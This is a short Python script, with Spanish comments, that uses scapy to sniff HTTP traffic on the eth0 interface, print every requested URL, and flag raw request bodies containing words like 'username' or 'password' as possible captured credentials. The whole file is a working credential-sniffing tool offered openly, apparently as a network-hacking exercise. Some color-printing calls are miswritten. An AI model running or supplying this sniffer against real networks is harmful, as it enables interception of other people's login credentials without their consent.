#!/usr/bin/env python3
 
import scapy.all as scapy
from scapy.layers import http
from termcolor import colored
import signal
import sys

def signal_handler(signal,frame):#esto es para que cuando se presione ctrl+c se detenga el programa
    print(colored("\n Saliendo... \n","red"))
    sys.exit(1)
    
signal.signal(signal.SIGINT,signal_handler)


def process_sniffed_packet(packet):
   cred_keywprds = ["username","user","login","password","pass"]
   if packet.haslayer(http.HTTPRequest):
      url = packet[http.HTTPRequest].Host.decode()+packet[http.HTTPRequest].Path.decode()
      print(colored(f"[+] HTTP Request >> {url}"),"blue")
      if packet.haslayer(scapy.Raw):# esto filtra los paquetes que contienen informacion de usuario y contraseña en la capa raw de http
          try:
           response =packet[scapy.Raw].load.decode()
           for keyword in cred_keywprds:
             if keyword in response:
                print(colored(f"\n\n[+] Posible usuario y contraseña: +¨{response}+\n\n"),"green")
                break
          except:
             pass


def sniff(interface):
    scapy.sniff(iface=interface,store=False,prn=process_sniffed_packet)



def main():
   sniff("eth0")



if __name__ == "__main__":
    main()